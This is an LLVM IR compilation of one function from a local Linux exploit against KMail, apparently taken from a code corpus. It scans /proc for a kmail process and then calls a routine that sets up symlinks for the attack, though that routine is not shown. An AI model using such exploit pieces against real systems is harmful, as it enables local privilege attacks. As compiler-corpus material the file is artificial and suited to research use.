; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19240.c_scan_processes.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19240.c_scan_processes.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@.str = private unnamed_addr constant [9 x i8] c"/proc/%s\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"cmdline\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"kmail\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"Yay! Found Kmail process #%s\0A\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"Lets set up the proper symlinks etc.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @scan_processes(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.stat, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca i32*, align 8
  store i8* %0, i8** %2, align 8
  %7 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %8 = call i32 @memset(i8* %7, i8 signext 0, i32 1024)
  %9 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %10 = load i8*, i8** %2, align 8
  %11 = call i32 @snprintf(i8* %9, i32 1024, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i8* %10)
  %12 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %13 = call i32 @chdir(i8* %12)
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  br label %41

16:                                               ; preds = %1
  %17 = call i32 @stat(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), %struct.stat* %3)
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %16
  br label %41

20:                                               ; preds = %16
  %21 = call i32* @fopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %21, i32** %6, align 8
  %22 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %23 = load i32*, i32** %6, align 8
  %24 = call i32 @fgets(i8* %22, i32 1024, i32* %23)
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %26 = call i32 @strncmp(i8* %25, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i32 1024)
  %27 = icmp ne i32 %26, 0
  %28 = xor i1 %27, true
  %29 = zext i1 %28 to i32
  %30 = icmp sgt i32 %29, 0
  br i1 %30, label %31, label %37

31:                                               ; preds = %20
  %32 = load i8*, i8** %2, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0), i8* %32)
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  %35 = load i8*, i8** %2, align 8
  %36 = call i32 @create_dirs(i8* %35)
  br label %40

37:                                               ; preds = %20
  %38 = load i32*, i32** %6, align 8
  %39 = call i32 @fclose(i32* %38)
  br label %40

40:                                               ; preds = %37, %31
  br label %41

41:                                               ; preds = %40, %19, %15
  ret void
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fgets(i8*, i32, i32*) #1

declare dso_local i32 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @create_dirs(i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
